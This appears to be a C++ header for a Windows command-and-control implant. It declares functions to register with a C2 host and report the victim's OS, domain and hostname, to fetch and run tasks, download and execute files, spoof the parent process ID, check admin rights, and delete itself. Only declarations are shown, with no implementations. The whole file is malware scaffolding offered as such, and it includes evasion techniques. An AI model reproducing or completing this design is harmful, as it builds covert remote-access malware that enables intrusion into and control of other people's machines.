#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlobj_core.h>
#include "json.hpp"

#pragma comment(lib, "winhttp.lib")


namespace network {
    std::wstring MakeHttpRequest(const std::wstring& host, const std::wstring& path, const std::wstring& data = L"", const std::wstring& method = L"POST");
}

namespace interpreter {
    std::wstring InterpretTask(std::wstring task);
    
    namespace action {
        bool SelfDelete();
        bool DownloadFile(std::wstring url, std::wstring path);
        bool IsAdmin();
        bool Execute(std::wstring path, bool spoofPPID, bool );
    }
}

namespace communication {
    nlohmann::json RegisterAgent(const std::wstring& c2_host, const std::wstring& os, const std::wstring& domain, const std::wstring& hostname);
    nlohmann::json FetchTask(const std::wstring& c2_host, const std::wstring& agent_id);
    bool SubmitResults(const std::wstring& c2_host, const std::wstring& agent_id, const nlohmann::json& task_result);

}

namespace misc {
    std::wstring JsonToWString(const nlohmann::json& j);
    nlohmann::json WStringToJson(const std::wstring& wstr);
}